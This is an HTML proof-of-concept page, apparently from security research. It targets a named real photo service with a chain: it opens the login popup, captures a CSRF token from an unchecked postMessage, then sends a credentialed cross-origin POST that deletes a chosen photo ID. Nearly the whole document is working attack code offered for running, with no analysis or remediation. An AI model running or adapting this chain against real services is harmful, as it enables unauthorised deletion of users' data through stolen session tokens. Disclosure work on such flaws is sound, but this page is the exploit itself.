<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC - Login to Delete Chain</title>
</head>
<body>
    <h3>PoC - Security Research</h3>
    
    Photo ID: <input type="text" id="photoId" value="11863114291"><br><br>
    
    <button onclick="startFlow()">Start Attack Flow</button>
    
    <pre id="log" style="background:#f4f4f4; padding:10px; max-height:400px; overflow:auto;"></pre>

<script>
const TARGET = {
    login: 'https://photos3.walmart.com/users/oauth2/login',
    builder: 'https://photos3.walmart.com/order/prints-builder',
    delete: 'https://photos3.walmart.com/order/add_from_prints_builder'
};

let csrfToken = null;

function log(msg) {
    document.getElementById('log').textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
    console.log(msg);
}

function startFlow() {
    log('Step 1: Opening login popup...');
    
    const popup = window.open(TARGET.login, 'loginPopup', 'width=700,height=800');
    if (!popup) {
        log('ERROR: Popup blocked. Allow popups for this page.');
        return;
    }
    
    // Listen for postMessage after login
    window.addEventListener('message', function handleMsg(event) {
        log(`Step 2: Message from ${event.origin}`);
        log(`Raw data: ${event.data}`);
        
        // Extract CSRF from login:{...} message
        if (typeof event.data === 'string' && event.data.includes('login:')) {
            try {
                const jsonStr = event.data.split('login:')[1];
                const data = JSON.parse(jsonStr);
                csrfToken = data.csrf;
                log(`✓ Captured CSRF: ${csrfToken}`);
                
                // Step 3: Open builder page
                log('Step 3: Opening prints-builder...');
                const builder = window.open(TARGET.builder, '_blank');
                
                // Step 4: Send delete request after short delay
                setTimeout(() => sendDelete(), 2500);
                
            } catch (e) {
                log(`Failed to parse message: ${e.message}`);
            }
        }
    });
    
    log('Waiting for login completion...');
}

async function sendDelete() {
    const photoId = document.getElementById('photoId').value.trim();
    
    if (!csrfToken) {
        log('ERROR: No CSRF token captured');
        return;
    }
    
    if (!photoId) {
        log('ERROR: No photo ID');
        return;
    }
    
    log(`Step 4: Sending DELETE request for photo ${photoId}`);
    
    const payload = {
        sizes: [],
        to_be_deleted: [parseInt(photoId)]
    };
    
    try {
        const response = await fetch(TARGET.delete, {
            method: 'POST',
            credentials: 'include',  // Auto-send cookies: _web-kiosk_session, etc.
            headers: {
                'Content-Type': 'application/json',
                'X-Csrf-Token': csrfToken,
                'Origin': 'https://photos3.walmart.com',
                'Referer': TARGET.builder
                // Note: Newrelic, Traceparent, etc. are optional for functionality
            },
            body: JSON.stringify(payload)
        });
        
        const text = await response.text();
        
        log(`Response: ${response.status} ${response.statusText}`);
        log(`Body: ${text}`);
        
        if (response.ok) {
            log('✅ SUCCESS: Delete request accepted');
        } else if (response.status === 403) {
            log('❌ 403: CSRF token may not be valid for this endpoint');
        } else if (response.status === 401) {
            log('❌ 401: Session not valid or cookies not sent');
        }
        
    } catch (err) {
        log(`❌ Fetch error: ${err.message}`);
        log('Note: CORS may block this request from a different origin');
    }
}

log('PoC loaded. Click button to start.');
</script>
</body>
</html>
